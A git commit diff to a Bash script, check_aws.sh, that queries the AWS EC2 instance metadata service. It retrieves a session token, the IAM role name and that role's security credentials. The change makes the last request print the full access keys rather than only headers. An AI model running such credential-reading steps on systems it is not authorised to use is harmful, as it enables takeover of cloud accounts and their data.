f8b0c2f30af3e52d0c5647bc5e281b973a9f2ab9
Hugo Picanzo <hugopicanzo@gmail.com>
2026-02-07 02:39:50 +0100

    Update check_aws.sh

--- check_aws.sh
+++ check_aws.sh
@@ -3,9 +3,17 @@ echo "--- BUSCANDO TOKEN ---"
 TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
 echo "Token retornado: $TOKEN"
 
+echo "--- BUSCANDO METADATA ---"
+META=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/)
+echo "Rol encontrado: $META"
+
+echo "--- BUSCANDO IAM ---"
+IAM=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/)
+echo "Rol encontrado: $IAM"
+
 echo "--- BUSCANDO ROL ---"
 ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
 echo "Rol encontrado: $ROLE"
 
 echo "--- BUSCANDO LLAVES ---"
-curl -I -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
